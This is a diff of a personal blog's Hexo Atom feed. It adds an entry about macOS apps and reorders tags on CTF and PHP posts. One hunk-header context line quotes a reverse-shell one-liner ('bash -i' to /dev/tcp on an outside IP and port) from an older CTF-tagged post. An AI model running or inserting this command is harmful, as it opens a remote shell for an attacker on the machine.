@@ -5,7 +5,7 @@
   <link href="/feed.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2017-02-06T16:21:02.000Z</updated>
+  <updated>2017-02-18T17:37:01.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -14,6 +14,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>App for my OSX</title>
+    <link href="https://www.virzz.com/2017/02/19/App%20for%20my%20OSX.html"/>
+    <id>https://www.virzz.com/2017/02/19/App for my OSX.html</id>
+    <published>2017-02-18T17:05:23.000Z</published>
+    <updated>2017-02-18T17:37:01.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;總結并記錄自己使用一些App的心得&lt;/p&gt;
+&lt;p&gt;Base&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;iTerm 2
+&lt;ul&gt;
+&lt;li&gt;很贊的一個終端，基本上是OSX的標配了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Alfred
+&lt;ul&gt;
+&lt;li&gt;這也是神器，效率啟動器！！！&lt;/li&gt;
+
+    
+    </summary>
+    
+    
+      <category term="mac" scheme="https://www.virzz.com/tags/mac/"/>
+    
+      <category term="osx" scheme="https://www.virzz.com/tags/osx/"/>
+    
+      <category term="app" scheme="https://www.virzz.com/tags/app/"/>
+    
+  </entry>
   
   <entry>
     <title>Flask-mongoengine 用法小記</title>
@@ -106,9 +139,9 @@ ssh -qTfnN -D 7070 -p 22 user@host
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
       <category term="web" scheme="https://www.virzz.com/tags/web/"/>
     
@@ -156,9 +189,9 @@ ssh-keygen -t
     
       <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
-      <category term="install" scheme="https://www.virzz.com/tags/install/"/>
-    
       <category term="mac" scheme="https://www.virzz.com/tags/mac/"/>
+    
+      <category term="install" scheme="https://www.virzz.com/tags/install/"/>
     
   </entry>
   
@@ -232,9 +265,9 @@ wget http://public-yum.oracle.com/public-yum-ol6.repo
     </summary>
     
     
-      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
       <category term="linux" scheme="https://www.virzz.com/tags/linux/"/>
     
@@ -421,9 +454,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="php" scheme="https://www.virzz.com/tags/php/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
